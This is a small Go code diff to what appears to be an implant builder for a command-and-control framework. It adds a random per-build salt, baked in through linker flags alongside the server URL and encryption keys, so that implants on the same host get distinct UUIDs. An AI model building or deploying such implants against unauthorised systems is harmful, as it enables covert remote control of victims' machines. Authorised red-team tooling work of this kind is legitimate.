@@ -2,7 +2,9 @@ package main
 
 import (
 	"crypto/md5"
+	"crypto/rand"
 	"crypto/sha256"
+	"encoding/hex"
 	"fmt"
 	"os"
 	"os/exec"
@@ -114,9 +116,14 @@ func (g *Generator) Build(cfg *Config) (*Result, error) {
 
 	outPath := filepath.Join(cfg.OutputDir, g.outputFilename(cfg))
 
+	// Per-build random salt so two implants on the same host get distinct UUIDs.
+	salt := make([]byte, 8)
+	rand.Read(salt) //nolint:errcheck
+
 	ldflags := "-X main.serverURL=" + cfg.ServerURL +
 		" -X main.encKey=" + cfg.EncKey +
-		" -X main.secondaryKey=" + cfg.SecondaryKey
+		" -X main.secondaryKey=" + cfg.SecondaryKey +
+		" -X main.instanceSalt=" + hex.EncodeToString(salt)
 
 	if cfg.Profile != nil {
 		p := cfg.Profile
